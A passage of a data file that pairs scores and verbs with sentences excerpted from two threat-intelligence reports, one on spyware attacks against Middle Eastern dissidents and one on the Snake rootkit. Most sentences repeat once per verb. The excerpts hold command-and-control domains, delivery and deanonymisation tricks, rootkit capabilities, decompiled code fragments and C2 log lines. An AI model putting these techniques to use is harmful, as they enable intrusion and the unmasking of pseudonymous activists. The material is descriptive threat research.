political detainee D also used\nthis C&C')(0.7857142857142857, 'used', ' An\nunidentified dropper using this C&C targeted Journalist F; a\nSpyNet attack on Relative of political detainee D also used\nthis C&C')(0.7777777777777778, 'downloaded', ' The exploits primarily downloaded instances of SpyNet\nfrom upload.bz, which for the most part communicated\nwith C&C at sn.all-google.com')(0.375, 'communicated', ' The exploits primarily downloaded instances of SpyNet\nfrom upload.bz, which for the most part communicated\nwith C&C at sn.all-google.com')(0.5, 'download', ' The attachment contained an embedded Flash file\nthat exploited a vulnerability fixed in Adobe Flash 11.4, loading\nshell code to download a second stage from faddeha.com')(0.2, 'loading', ' The attachment contained an embedded Flash file\nthat exploited a vulnerability fixed in Adobe Flash 11.4, loading\nshell code to download a second stage from faddeha.com')(0.68, 'sends', ' The at-\ntacker sends the pseudonymous account a link to a webpage or\nan e-mail containing an embedded remote image, using one of\nmany freely-available services.<fn>2</fn>  When the victim clicks on the\nlink or opens the e-mail, their IP address is revealed to the at-\ntacker.<fn>3</fn>  The attacker then discovers the victim’s identity from\ntheir ISP')(0.7142857142857143, 'causing', '         Their filenames contained a Uni-\n    code right-to-left override (RLO) character, causing Windows\n    to render a filename such as gpj.1bajaR.exe instead as\n    exe.Rajab1.jpg')(1.0, 'contained', '         Their filenames contained a Uni-\n    code right-to-left override (RLO) character, causing Windows\n    to render a filename such as gpj.1bajaR.exe instead as\n    exe.Rajab1.jpg')(0.3333333333333333, 'arrived', ' In that latter case, the sample arrived via e-mail\nin a .rar attachment that contained an .scr file disguised\nas a Word document')(0.7777777777777778, 'disguised', ' In that latter case, the sample arrived via e-mail\nin a .rar attachment that contained an .scr file disguised\nas a Word document')(0.6842105263157895, 'using', ' On\nthe one hand, we have observed attacks using a wide range of\noff-the-shelf spyware, as well as publicly available third-party\nservices, like iplogger.org')(0.2857142857142857, 'used', '\n   The instance of Xtreme RAT sent to Author used\nowner.no-ip.biz for its C&C, one of the domains men-\ntioned in a report published by Norman about a year-long cam-\npaign of cyberattacks on Israeli and Palestinian targets carried\nout by a group that Norman was unable to identify <fn>[57]</fn> ')(0.6875, 'reveal', ' The\n    second involved specially crafted IP spy links and e-mails de-\n    signed to reveal the IP addresses of operators of pseudonymous\n    accounts')(0.1, 'involved', ' The\n    second involved specially crafted IP spy links and e-mails de-\n    signed to reveal the IP addresses of operators of pseudonymous\n    accounts')(0.75, 'forwarded', ' We also found two groups\nthat forwarded to the same address')(0.8, 'received', '\n   Use of embedded remote images: We identified several\ntargets who received spoofed e-mails containing embedded\nremote images')(0.4166666666666667, 'obscure', '\n   Gamma documentation advertises that an operator of FinSpy\ncan obscure the location of the C&C server (called the mas-\nter) by setting up a proxy known as a relay')(0.7, 'received', '\n   Two weeks after this correspondence with Ahmed, one of us\n(Author in Figure 5) received a targeted e-mail with a link to\na file hosted on Google Docs containing a commercial off-the-\n\nshelf RAT, Xtreme RAT')(0.4117647058823529, 'download', ' The document used the\n same exploit and attempted to download a second stage from\n rcs-demo.hackingteam.it, which was unavailable at\n the time of testing')(0.5714285714285714, 'share', ' These attacks share the same\nC&C, 216.6.0.28, a Syrian IP address belonging to the Syr-\nian Telecommunications Establishment, and publicly reported\nas a C&C of Syrian malware since February 2012 <fn>[45]</fn> ')(0.6086956521739131, 'contained', '\n       The other .rar files contained a Word document with an\n    embedded ASCII-encoded PE file containing a custom macro\n    set to automatically run upon document startup')(1.0, 'incorporating', '\n    The attacks, while sometimes incorporating effective so-\ncial engineering, in general lack novel technical elements')(0.5, 'loaded', ' .” The page redirected to a YouTube\nvideo a few seconds later, but first loaded a Java exploit <fn>[64]</fn> —a\n\n<footer>USENIX Association \t                                                                                 23rd USENIX Security Symposium\u2003 519</footer>\n\x0cknown vulnerability with no patch at the time that the e-mails\nwere sent')(0.5263157894736842, 'targeted', '\n</footnote>\nrevolved around Tweets that referred to Bahrain’s King as a\n“cursed one.” Red Sky had earlier targeted other users with IP\nspy links shortened using the al9mood bit.ly account')(0.6842105263157895, 'uses', ' We located a version of FinSpy that does not\nuse the normal FinSpy handshake, but instead uses a protocol\nbased on HTTP POST requests for communication with the\nC&C server')(0.25, 'used', ' The attack downloaded an instance of\nSpyNet from isteeler.com (which from our inspection did\nnot appear to have any legitimate content), which used the\nC&C storge.myftp.org')(0.36, 'downloaded', ' The attack downloaded an instance of\nSpyNet from isteeler.com (which from our inspection did\nnot appear to have any legitimate content), which used the\nC&C storge.myftp.org')(0.7272727272727273, 'received', ' @YLUBH received at\nleast three IP spy links in late 2012, sent via public Twitter mes\nsages')(1.0, 'probes', ' The spyware period-\nically probes this folder for files that match a certain naming\nconvention, then sends them to the C&C server')(0.6363636363636364, 'sends', ' The spyware period-\nically probes this folder for files that match a certain naming\nconvention, then sends them to the C&C server')(0.42857142857142855, 'ran', ' The .scr file was a self-extracting\narchive that decompressed and ran both the bait document\nand the payload')(0.2857142857142857, 'use', '\n    For seeding, the attackers typically use compromised ac-\ncounts (including those of arrested individuals) or fake iden-\ntities masquerading as pro-opposition')(0.2647058823529412, 'used', ' Attackers often used (1) accounts of promi-\nnent or trusted but jailed individuals like “Red Sky,” (2) fake\npersonas (e.g., attractive women or fake job seekers when tar-\ngeting a labor union), or (3) impersonations of legitimate ac-\ncounts')(0.5, 'communicated', ' This sample of SpyNet\ncommunicated with the same C&C hamas.sytes.net')(1.0, 'downloaded', ' In all, these totaled 17 distinct\nhashes of documents, and 10 distinct hashes of payloads (some\ndocuments that differed in their hash downloaded the same pay-\nload)')(0.38461538461538464, 'downloaded', "\nThe exploit loaded shellcode that downloaded a second stage\n<figure>\n         UAE Gov't         HackingTeam            3-Stage\n                                               Exploit Kit\n                                                                 owner.no-ip.biz\n                   CVE-2010-3333\n                                         “wikileaks”         Xtreme RAT\n                   RCS                 “veryimportant”\n                                 Author\n          ar-24.com                                Communicated\n                                                     via E-Mail\n         Ahmed\n                       Laptop\n                      infected\n                                        E-Mail account\n                                        compromised\n                                        </figure>\n                                        <caption>\n Figure 5: Part of the ecosystem of UAE surveillance at-\n tacks.</caption>\n from ar-24.com, which in turn downloaded spyware from\n ar-24.com")(1.0, 'loaded', "\nThe exploit loaded shellcode that downloaded a second stage\n<figure>\n         UAE Gov't         HackingTeam            3-Stage\n                                               Exploit Kit\n                                                                 owner.no-ip.biz\n                   CVE-2010-3333\n                                         “wikileaks”         Xtreme RAT\n                   RCS                 “veryimportant”\n                                 Author\n          ar-24.com                                Communicated\n                                                     via E-Mail\n         Ahmed\n                       Laptop\n                      infected\n                                        E-Mail account\n                                        compromised\n                                        </figure>\n                                        <caption>\n Figure 5: Part of the ecosystem of UAE surveillance at-\n tacks.</caption>\n from ar-24.com, which in turn downloaded spyware from\n ar-24.com")(0.7142857142857143, 'ran', '\n    The C&C server also ran on ar-24.com')(0.7777777777777778, 'communicated', ' The SpyNet sample communicated\nwith the C&C hamas.sytes.net')(0.8, 'slowing', ' These techniques often limit\nthe world-visibility of malicious files and links, slowing their\ndetection by common AV products')(0.5, 'installed', ' We also saw instances\n of the 3-Stage Exploit Kit where the first stage contained a\n Flash exploit; in some cases, we could obtain all stages and\n confirm that these installed RCS')(0.6666666666666666, 'communicated', ' Two RCS and 5 FSBSpy samples from VirusTo-\ntal communicated with various servers in the group')(0.7777777777777778, 'resulted', ' Both attacks resulted in an Xtreme RAT infection')(0.5, 'connect', ' We then infected the\nVM with FinSpy and allowed it to connect to the Bahrain C&C\nserver')(0.7692307692307693, 'posting', '\n   Two of the other CVE-2012-0158 exploits down-\nloaded DarkComet from www.getmedia.us and\nwww.technopenta.com after posting system infor-\nmation to random123.site11.com')(0.5, 'use', ' On the other hand, some at-\ntacks use so-called “lawful intercept” trojans and related equip-\n<footnote>\n   1 Dates   in the paper are given MM/DD/YY')(0.6153846153846154, 'connect', '\nThis executable contained a similar string, except it identi-\nfied itself as FinSpy v3.00, and attempted to connect to\ntiger.gamma-international.de, a domain registered\nto Gamma International GmbH')(0.6428571428571429, 'used', ' While corresponding\nwith Ahmed on his compromised account, an author of this pa-\nper discovered that the attackers had installed an application-\nspecific password <fn>[56]</fn>  in Ahmed’s GMail account, a secondary\n\npassword that they apparently used to access his account even\nafter he changed his main password')(0.42857142857142855, 'used', ' In some cases the attackers employed\nexpensive and “government exclusive” malware, while in other\ncases, attackers used cheap and readily available RATs')(0.5, 'employed', ' In some cases the attackers employed\nexpensive and “government exclusive” malware, while in other\ncases, attackers used cheap and readily available RATs')(0.8823529411764706, 'received', ' These individuals received e-mails containing a\nlink to a web page hosted on cedarkeyrv.com impersonat-\ning YouTube')(0.6, 'installs', ' We located additional samples (see\n § 5), some of which were embedded in a .jar file that installs\n an OS-appropriate version of RCS (Windows or OSX), option-\n ally using an exploit')(0.7142857142857143, 'use', '\n    The first attacks in Figure 3 date to 2012, and use bait files\nwith a DarkComet RAT payload')(0.9, 'discover', '\n</section><section>\n<heading>IP spy Campaign.</heading> In an IP spy attack, the attacker aims to\ndiscover the IP address of a victim who is typically the opera-\ntor of a pseudonymous social media or e-mail account')(0.7222222222222222, 'contained', '        We found that some\n    of the attachments contained a PE (.exe) file designed to\n    appear as an image')(1.0, 'plays', ' Across\nthese cases we find that clever social engineering often plays\na central role, which is strong evidence of a well-informed ad-\nversary')(0.4, 'install', ' One difference was in the vectors\n used to install the spyware')(0.15, 'receive', ' Typically, targets receive\neither (1) a PE in a .zip or .rar, (2) a file download link, or\n(3) a link that will trigger a drive-by download')(1.0, 'stay', '\n\nThe analysed code suggests that even file system and registry operations can be delegated by an infected module to another\nmodule in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of\nthe browser processes so that the injected module could still write into files and into the sensitive registry hives')(1.0, 'overcome', '\n\nThe analysed code suggests that even file system and registry operations can be delegated by an infected module to another\nmodule in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of\nthe browser processes so that the injected module could still write into files and into the sensitive registry hives')(0.4444444444444444, 'write', '\n\nThe analysed code suggests that even file system and registry operations can be delegated by an infected module to another\nmodule in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of\nthe browser processes so that the injected module could still write into files and into the sensitive registry hives')(1.0, 'provide', '\n\nAnalysis of the commands performed by the malware suggests the following capabilities:\n<list>\n    •\t   Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)\n    •\t   Set maximum upload file size\n    •\t   Go ‘stealth’ mode for the specified number of days - Snake will not initiate any connections during that time\n    •\t   Run specified shell commands and collect the output logs for further delivery\n    •\t   Modify settings stored with the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n    •\t   Search for files\n    •\t   Upload specified files\n    •\t   Add new C&C domains\n    •\t   Update the driver with a new version\n    •\t   Download files\n    •\t   Run specified executable files\n    •\t   Set self-deactivation timeout\n    •\t   If the virtual partition \\\\.\\vd1 exists, copy all Snake logs into that partition\n</list>\nTogether, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised\nsystem')(0.8333333333333334, 'allowing', '\n\nAnalysis of the commands performed by the malware suggests the following capabilities:\n<list>\n    •\t   Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)\n    •\t   Set maximum upload file size\n    •\t   Go ‘stealth’ mode for the specified number of days - Snake will not initiate any connections during that time\n    •\t   Run specified shell commands and collect the output logs for further delivery\n    •\t   Modify settings stored with the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n    •\t   Search for files\n    •\t   Upload specified files\n    •\t   Add new C&C domains\n    •\t   Update the driver with a new version\n    •\t   Download files\n    •\t   Run specified executable files\n    •\t   Set self-deactivation timeout\n    •\t   If the virtual partition \\\\.\\vd1 exists, copy all Snake logs into that partition\n</list>\nTogether, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised\nsystem')(0.5714285714285714, 'performed', '\n\nAnalysis of the commands performed by the malware suggests the following capabilities:\n<list>\n    •\t   Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)\n    •\t   Set maximum upload file size\n    •\t   Go ‘stealth’ mode for the specified number of days - Snake will not initiate any connections during that time\n    •\t   Run specified shell commands and collect the output logs for further delivery\n    •\t   Modify settings stored with the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n    •\t   Search for files\n    •\t   Upload specified files\n    •\t   Add new C&C domains\n    •\t   Update the driver with a new version\n    •\t   Download files\n    •\t   Run specified executable files\n    •\t   Set self-deactivation timeout\n    •\t   If the virtual partition \\\\.\\vd1 exists, copy all Snake logs into that partition\n</list>\nTogether, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised\nsystem')(0.5454545454545454, 'inspects', '\n\nThe driver inspects bidirectional network data on a per stream basis, as it’s located right on the stream data path')(0.5714285714285714, 'start', ' a browser), it will inject malicious DLL module\n         into it; depending on the operational mode, the DLL may start communicating with C&C directly')(1.0, 'inject', ' a browser), it will inject malicious DLL module\n         into it; depending on the operational mode, the DLL may start communicating with C&C directly')(0.8181818181818182, 'installs', ' In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit\ndriver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP')(0.8888888888888888, 'ensure', ' In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit\ndriver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP')(1.0, 'install', ' In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit\ndriver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP')(0.125, 'log', '\n\nIn order to log its activity, the driver writes log data into the pipe \\Device\\NamedPipe\\isapi_log, so that the DLL could log the\ndata into the log files')(0.7, 'writes', '\n\nIn order to log its activity, the driver writes log data into the pipe \\Device\\NamedPipe\\isapi_log, so that the DLL could log the\ndata into the log files')(0.8181818181818182, 'store', '\n\n Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it')(0.4, 'uses', '\n\n Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it')(1.0, 'insert', ' An ability to\nmanipulate data streams is provided with the packet injection logic below, allowing Snake to covertly insert traffic destined to its\nC&C servers:\n<code>\n      01    int __stdcall stream_inject(int flowHandle, int calloutId, int layerId)\n      02    {\n      03        int iRet = 0;\n      04        int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool, 0, 0, 0, 0, &iRet);\n      05        if (!ntStatus)\n      06        {\n      07            ntStatus = _FwpsStreamInjectAsync(m_hInjection,\n      08                                               0,\n      09                                               0,\n      10                                               flowHandle,\n      11                                               calloutId,\n      12                                               layerId,\n      13                                               20,\n      14                                               3,\n      15                                               iRet,\n      16                                               0,\n      17                                               sStreamInjectCompletion,\n      18                                               0);\n      19        if (!ntStatus)\n      20        {\n      21            iRet = 0;\n      22        }\n      23        if (iRet)\n      24        {\n      25           FwpsFreeNetBufferList(iRet);\n      26        }\n      27        return ntStatus;\n      28    }\n</code>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014           15</footer>\n\x0cIn order to qualify as a browser, the usermode process must have any of the following names:\n<code>\n        01    bool isBrowserProcess(const wchar_t *szProcName)\n        02    {\n        03        return !wcsicmp(szProcName, L”iexplore.exe”) ||\n        04               !wcsicmp(szProcName, L”firefox.exe”) ||\n        05               !wcsicmp(szProcName, L”opera.exe”) ||\n        06               !wcsicmp(szProcName, L”netscape.exe”) ||\n        07               !wcsicmp(szProcName, L”mozilla.exe”) ||\n        08               !wcsicmp(szProcName, L”chrome.exe”);\n        09    }\n</code>\n</section>\n<section>\n<heading>\n\n\n\nTDI FILTER DRIVER</heading>\nIn addition to WFP, Snake also hooks the Transport Driver Interface (TDI) network routines by setting itself up as a TDI filter driver')(0.75, 'manipulate', ' An ability to\nmanipulate data streams is provided with the packet injection logic below, allowing Snake to covertly insert traffic destined to its\nC&C servers:\n<code>\n      01    int __stdcall stream_inject(int flowHandle, int calloutId, int layerId)\n      02    {\n      03        int iRet = 0;\n      04        int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool, 0, 0, 0, 0, &iRet);\n      05        if (!ntStatus)\n      06        {\n      07            ntStatus = _FwpsStreamInjectAsync(m_hInjection,\n      08                                               0,\n      09                                               0,\n      10                                               flowHandle,\n      11                                               calloutId,\n      12                                               layerId,\n      13                                               20,\n      14                                               3,\n      15                                               iRet,\n      16                                               0,\n      17                                               sStreamInjectCompletion,\n      18                                               0);\n      19        if (!ntStatus)\n      20        {\n      21            iRet = 0;\n      22        }\n      23        if (iRet)\n      24        {\n      25           FwpsFreeNetBufferList(iRet);\n      26        }\n      27        return ntStatus;\n      28    }\n</code>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014           15</footer>\n\x0cIn order to qualify as a browser, the usermode process must have any of the following names:\n<code>\n        01    bool isBrowserProcess(const wchar_t *szProcName)\n        02    {\n        03        return !wcsicmp(szProcName, L”iexplore.exe”) ||\n        04               !wcsicmp(szProcName, L”firefox.exe”) ||\n        05               !wcsicmp(szProcName, L”opera.exe”) ||\n        06               !wcsicmp(szProcName, L”netscape.exe”) ||\n        07               !wcsicmp(szProcName, L”mozilla.exe”) ||\n        08               !wcsicmp(szProcName, L”chrome.exe”);\n        09    }\n</code>\n</section>\n<section>\n<heading>\n\n\n\nTDI FILTER DRIVER</heading>\nIn addition to WFP, Snake also hooks the Transport Driver Interface (TDI) network routines by setting itself up as a TDI filter driver')(0.4444444444444444, 'hooks', ' An ability to\nmanipulate data streams is provided with the packet injection logic below, allowing Snake to covertly insert traffic destined to its\nC&C servers:\n<code>\n      01    int __stdcall stream_inject(int flowHandle, int calloutId, int layerId)\n      02    {\n      03        int iRet = 0;\n      04        int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool, 0, 0, 0, 0, &iRet);\n      05        if (!ntStatus)\n      06        {\n      07            ntStatus = _FwpsStreamInjectAsync(m_hInjection,\n      08                                               0,\n      09                                               0,\n      10                                               flowHandle,\n      11                                               calloutId,\n      12                                               layerId,\n      13                                               20,\n      14                                               3,\n      15                                               iRet,\n      16                                               0,\n      17                                               sStreamInjectCompletion,\n      18                                               0);\n      19        if (!ntStatus)\n      20        {\n      21            iRet = 0;\n      22        }\n      23        if (iRet)\n      24        {\n      25           FwpsFreeNetBufferList(iRet);\n      26        }\n      27        return ntStatus;\n      28    }\n</code>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014           15</footer>\n\x0cIn order to qualify as a browser, the usermode process must have any of the following names:\n<code>\n        01    bool isBrowserProcess(const wchar_t *szProcName)\n        02    {\n        03        return !wcsicmp(szProcName, L”iexplore.exe”) ||\n        04               !wcsicmp(szProcName, L”firefox.exe”) ||\n        05               !wcsicmp(szProcName, L”opera.exe”) ||\n        06               !wcsicmp(szProcName, L”netscape.exe”) ||\n        07               !wcsicmp(szProcName, L”mozilla.exe”) ||\n        08               !wcsicmp(szProcName, L”chrome.exe”);\n        09    }\n</code>\n</section>\n<section>\n<heading>\n\n\n\nTDI FILTER DRIVER</heading>\nIn addition to WFP, Snake also hooks the Transport Driver Interface (TDI) network routines by setting itself up as a TDI filter driver')(0.6666666666666666, 'fetches', '\nNext, it fetches a file /D/pub.txt, and expects the server to respond with a string “1”, acknowledging it’s active:\n<list>\n      03:52:06 1336: Connect swim.onlinewebshop.net                    type(0)..')(0.8, 'expects', '\nNext, it fetches a file /D/pub.txt, and expects the server to respond with a string “1”, acknowledging it’s active:\n<list>\n      03:52:06 1336: Connect swim.onlinewebshop.net                    type(0)..')(0.4090909090909091, 'copying', ' If such a driver is installed via an update, the usermode component can be instructed to delegate the file upload\ntask to the driver by copying all the necessary logs into the shared virtual partition, physically located on the compromised host and\nthus, accessible from kernel')(0.75, 'maintain', ' They use highly sophisticated\nmalware tools to maintain persistent access to their targets')(0.125, 'register', '\n\n<footer>                                                            BAE Systems Applied Intelligence: Snake Rootkit Report 2014           16</footer>\n\x0cAfter that, the drivers hooks the following exports within ndis.sys (for NDIS 6.0):\n<list>\n    •\t NdisFRegisterFilterDriver\n    •\t NdisFDeregisterFilterDriver\n    •\t NdisSetOptionalHandlers\n    •\t NdisFSetAttributes\n</list>\nAnother set of exports it attempts to hook in ndis.sys (for NDIS 6.0) is:\n<list>\n    •\t NdisMRegisterMiniportDriver\n    •\t NdisMDeregisterMiniportDriver\n    •\t NdisMIndicateReceiveNetBufferLists\n    •\t NdisMRestartComplete\n    •\t NdisMPauseComplete\n</list>\nWith the hooks installed, whenever the network adapter driver attempts to register to NDIS, or whenever there is an attempt to\ninstall NDIS intermediate driver or NDIS filter driver, the hook handlers will register Snake’s own MiniportXxx functions with the NDIS\nlibrary')(1.0, 'installed', '\n\n<footer>                                                            BAE Systems Applied Intelligence: Snake Rootkit Report 2014           16</footer>\n\x0cAfter that, the drivers hooks the following exports within ndis.sys (for NDIS 6.0):\n<list>\n    •\t NdisFRegisterFilterDriver\n    •\t NdisFDeregisterFilterDriver\n    •\t NdisSetOptionalHandlers\n    •\t NdisFSetAttributes\n</list>\nAnother set of exports it attempts to hook in ndis.sys (for NDIS 6.0) is:\n<list>\n    •\t NdisMRegisterMiniportDriver\n    •\t NdisMDeregisterMiniportDriver\n    •\t NdisMIndicateReceiveNetBufferLists\n    •\t NdisMRestartComplete\n    •\t NdisMPauseComplete\n</list>\nWith the hooks installed, whenever the network adapter driver attempts to register to NDIS, or whenever there is an attempt to\ninstall NDIS intermediate driver or NDIS filter driver, the hook handlers will register Snake’s own MiniportXxx functions with the NDIS\nlibrary')(0.75, 'hooks', '\n\nAfter that, the drivers hooks the following exports within ndis.sys:\n<list>\n    •\t NdisIMRegisterLayeredMiniport\n    •\t NdisTerminateWrapper\n</list>\nThe rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above:\n<list>\n    Unique name: {c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\n    User-readable description: filter_c06b1a3b\n</list>\nNDIS filter driver configuration is stored in the registry entry:\n<list>\n    HKLM\\SYSTEM\\CurrentControlSet\\Control\\Network\\{4d36e974-e325-11ce-bfc1-08002be10318}\n</list>\nThe driver is registered with NdisFRegisterFilterDriver() API')(0.6666666666666666, 'receives', ' OK\n      03:52:11 1404: GET /D/77568289\n      03:52:12 1404: Http status: 200\n      03:52:12 1404: Command for all\n      03:52:12 1404: recv 346/346\n      03:52:12 Command Id:303149772662877808(130201837456870000)[13:42:25 05/08/2013]\n</list>\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        9</footer>\n\n\n\x0cThe command it receives from C&C above (swim.onlinewebshop.net) is encrypted')(0.375, 'starts', '\n\nInfection starts from a dropper penetrating into the compromised system where it is allowed to run')(0.8333333333333334, 'registered', '\n\n\nBeing registered as a TDI driver on the device stack, Snake hooks TCP calls')(0.5, 'hooks', '\n\n\nBeing registered as a TDI driver on the device stack, Snake hooks TCP calls')(0.7692307692307693, 'hide', '\n\nThe ObOpenObjectByName() hook is designed to hide the presence of its virtual partitions (described later)')(0.4, 'write', ' Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/\nregistry')(1.0, 'overcome', ' Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/\nregistry')(0.8, 'send', '\n\nFor example, on HTTP traffic arrival it may send traffic data into a memory pipe \\Device\\NamedPipe\\isapi_http, and then,\nsend a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS:PORT]0frag_no_scrambling=Y0 into\nanother memory pipe called \\Device\\NamedPipe\\isapi_dg')(1.0, 'load', '\n\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that\nmodule for the communications')(0.7777777777777778, 'use', '\n\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that\nmodule for the communications')(0.8181818181818182, 'associated', ' It carries a list of interface identifiers associated with\nthe named pipes')(1.0, 'defines', '\nTo send the data back, the protocol driver defines the data\nin a list of NET_BUFFER_LIST structures, and then passes\nthem to NDIS by calling NdisSendNetBufferLists()')(0.16666666666666666, 'calling', '\nTo send the data back, the protocol driver defines the data\nin a list of NET_BUFFER_LIST structures, and then passes\nthem to NDIS by calling NdisSendNetBufferLists()')(0.6, 'send', '\nTo send the data back, the protocol driver defines the data\nin a list of NET_BUFFER_LIST structures, and then passes\nthem to NDIS by calling NdisSendNetBufferLists()')(1.0, 'stores', '\n\n For example, it stores its message queue in a file called:\n<list>\n \\.\\\\Hd1\\queue\n</list>\n The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL,\n e.g')(0.8333333333333334, 'detect', '\n\nBeing able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to\n‘inject’ the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic\nto detect traffic addressed to itself:\n<figure>\n                                                                                       Infected User        Injected\n                                    Traffic Interception                                 Application        Module\n                                0xDEADBEAF/0xC001BA5E\n                                           Checks\n                                                    WFP           TDI          NDIS\n                  Internet                                                                                        Memory\n                                                                                                                   pipes\n                                      Traffic\n                                    Injection\n\n\n                                                                        Snake’s Kernel Mode Driver\n</figure>\n\n</section>\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014           17</footer>\n\n\x0c\n<section>\n<heading>DEAD BEEF ON A COOL BASE</heading>\nAs the driver intercepts all connections (e.g')(0.125, 'manipulate', '\n\nBeing able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to\n‘inject’ the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic\nto detect traffic addressed to itself:\n<figure>\n                                                                                       Infected User        Injected\n                                    Traffic Interception                                 Application        Module\n                                0xDEADBEAF/0xC001BA5E\n                                           Checks\n                                                    WFP           TDI          NDIS\n                  Internet                                                                                        Memory\n                                                                                                                   pipes\n                                      Traffic\n                                    Injection\n\n\n                                                                        Snake’s Kernel Mode Driver\n</figure>\n\n</section>\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014           17</footer>\n\n\x0c\n<section>\n<heading>DEAD BEEF ON A COOL BASE</heading>\nAs the driver intercepts all connections (e.g')(1.0, 'intercepts', '\n\nBeing able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to\n‘inject’ the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic\nto detect traffic addressed to itself:\n<figure>\n                                                                                       Infected User        Injected\n                                    Traffic Interception                                 Application        Module\n                                0xDEADBEAF/0xC001BA5E\n                                           Checks\n                                                    WFP           TDI          NDIS\n                  Internet                                                                                        Memory\n                                                                                                                   pipes\n                                      Traffic\n                                    Injection\n\n\n                                                                        Snake’s Kernel Mode Driver\n</figure>\n\n</section>\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014           17</footer>\n\n\x0c\n<section>\n<heading>DEAD BEEF ON A COOL BASE</heading>\nAs the driver intercepts all connections (e.g')(0.7142857142857143, 'install', '\nThis explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable\nVBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and\nfinally, load the driver')(0.14285714285714285, 'start', '\nThis explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable\nVBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and\nfinally, load the driver')(0.5384615384615384, 'registers', '\nThis explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable\nVBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and\nfinally, load the driver')(0.3333333333333333, 'load', '\nThis explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable\nVBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and\nfinally, load the driver')(0.7272727272727273, 'running', ' It attempts to do this by\nrunning MS09-025 and MS10-015 exploits on the target system')(0.39473684210526316, 'suggests', '\n\nThe presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further')(0.6666666666666666, 'spread', '\n\nThe presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further')(0.8, 'compromise', '\n\nThe presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further')(1.0, 'replicate', '\n\nThe presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further')(0.2857142857142857, 'infect', '\n\nThe presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further')(0.75, 'keep', ' A great deal of attention has also\nbeen given to keep its network communications as quiet as possible')(0.75, 'scanned', ' When the data arrives, it is intercepted with the\nFwpsCopyStreamDataToBuffer0() API, and then scanned for the presence of the hidden commands from C&C')(0.5714285714285714, 'distinguish', '\n\n\nBy ‘sniffing’ all the requests, it can now inspect the traffic, looking for and then parsing GET/POST HTTP requests and also SMTP\ncommunications, in order to distinguish commands addressed to itself')(0.36363636363636365, 'inspect', '\n\n\nBy ‘sniffing’ all the requests, it can now inspect the traffic, looking for and then parsing GET/POST HTTP requests and also SMTP\ncommunications, in order to distinguish commands addressed to itself')(0.3333333333333333, 'calls', '\nNDIS, in turn, calls the miniport driver’s\nMiniportSendNetBufferLists() function to forward\nthe data to an underlying miniport driver')(0.14285714285714285, 'makes', ' Its ability to 